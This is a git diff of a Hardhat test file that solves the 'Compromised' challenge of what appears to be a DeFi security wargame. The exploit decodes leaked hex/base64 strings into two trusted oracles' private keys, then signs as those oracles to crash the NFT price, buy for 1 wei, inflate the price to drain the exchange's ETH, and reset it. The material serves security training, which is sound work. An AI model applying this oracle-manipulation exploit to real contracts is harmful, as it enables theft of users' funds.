@@ -38,9 +38,7 @@ describe('Compromised challenge', function () {
 			attacker.address,
 			'0x16345785d8a0000', // 0.1 ETH
 		])
-		expect(await ethers.provider.getBalance(attacker.address)).to.equal(
-			ethers.utils.parseEther('0.1')
-		)
+		expect(await ethers.provider.getBalance(attacker.address)).to.equal(ethers.utils.parseEther('0.1'))
 
 		// Deploy the oracle and setup the trusted sources with initial prices
 		this.oracle = await TrustfulOracleFactory.attach(
@@ -60,38 +58,76 @@ describe('Compromised challenge', function () {
 		this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token())
 	})
 
-	/** CODE YOUR EXPLOIT HERE */
 	it('Exploit', async function () {
-		/**
-		 * MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
-		 * MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
-		 */
+		/** CODE YOUR EXPLOIT HERE */
+		// Helper function for converting the data from Base64 format into a private key in hex format
+		const leakToPrivateKey = (leak) => {
+			const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`)
+			const hexKey = Buffer.from(base64, `base64`).toString(`utf8`)
+			return hexKey
+		}
 
-		str1 =
-			'd48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535'
-		str2 =
-			'4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134'
-		pk1 =
-			'0xAB7A8B90E97F4719A64B8CC02610568B3DA1CCF458CD9F09F0606545BB8822640521553611A81C129E03EE03053B9F4C3A2B64834B8D79C7'
-		pk2 =
-			'0x2694CF0DCDBA631A8BB91B82329316A91535BB2034922D2D7FCCE78C1B40F6FCF4C6DE62223A1A8E61C1B97DEC50D17EC6D802167B11F5059CE'
+		// Leaked information to format
+		const leakedInformation = [
+			'4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+			'4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
+		]
+
+		// Get private keys and initialize wallets
+		const privateKey1 = leakToPrivateKey(leakedInformation[0])
+		const privateKey2 = leakToPrivateKey(leakedInformation[1])
+		const trustedOracle1 = new ethers.Wallet(privateKey1, ethers.provider)
+		const trustedOracle2 = new ethers.Wallet(privateKey2, ethers.provider)
+
+		// Get the symbol of the NFT to be changed
+		const tokenSymbol = await this.nftToken.symbol()
+
+		// Change its price to zero
+		console.log(
+			'NFT price before attack: ',
+			String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+		)
+		await this.oracle.connect(trustedOracle1).postPrice(tokenSymbol, 0)
+		await this.oracle.connect(trustedOracle2).postPrice(tokenSymbol, 0)
+
+		// Buy the NFT paying 1 wei
+		console.log('NFT price when buying: ', String(await this.oracle.getMedianPrice(tokenSymbol)))
+		await this.exchange.connect(attacker).buyOne({value: 1})
+
+		// Change price of the owned NFT to the balance amount in the Exchange contract
+		await this.oracle.connect(trustedOracle1).postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE)
+		await this.oracle.connect(trustedOracle2).postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE)
+
+		// Approve NFT to the exchange and sell it for all  its ETH
+		console.log(
+			'NFT price when selling: ',
+			String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+		)
+		await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+		await this.exchange.connect(attacker).sellOne(0)
+
+		// Change price back to its original value
+		await this.oracle.connect(trustedOracle1).postPrice(tokenSymbol, INITIAL_NFT_PRICE)
+		await this.oracle.connect(trustedOracle2).postPrice(tokenSymbol, INITIAL_NFT_PRICE)
+		console.log(
+			'NFT price after attack: ',
+			String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+		)
 	})
 
-	// after(async function () {
-	// 	/** SUCCESS CONDITIONS */
+	after(async function () {
+		/** SUCCESS CONDITIONS */
 
-	// 	// Exchange must have lost all ETH
-	// 	expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq('0')
+		// Exchange must have lost all ETH
+		expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq('0')
 
-	// 	// Attacker's ETH balance must have significantly increased
-	// 	expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
-	// 		EXCHANGE_INITIAL_ETH_BALANCE
-	// 	)
+		// Attacker's ETH balance must have significantly increased
+		expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE)
 
-	// 	// Attacker must not own any NFT
-	// 	expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq('0')
+		// Attacker must not own any NFT
+		expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq('0')
 
-	// 	// NFT price shouldn't have changed
-	// 	expect(await this.oracle.getMedianPrice('DVNFT')).to.eq(INITIAL_NFT_PRICE)
-	// })
+		// NFT price shouldn't have changed
+		expect(await this.oracle.getMedianPrice('DVNFT')).to.eq(INITIAL_NFT_PRICE)
+	})
 })
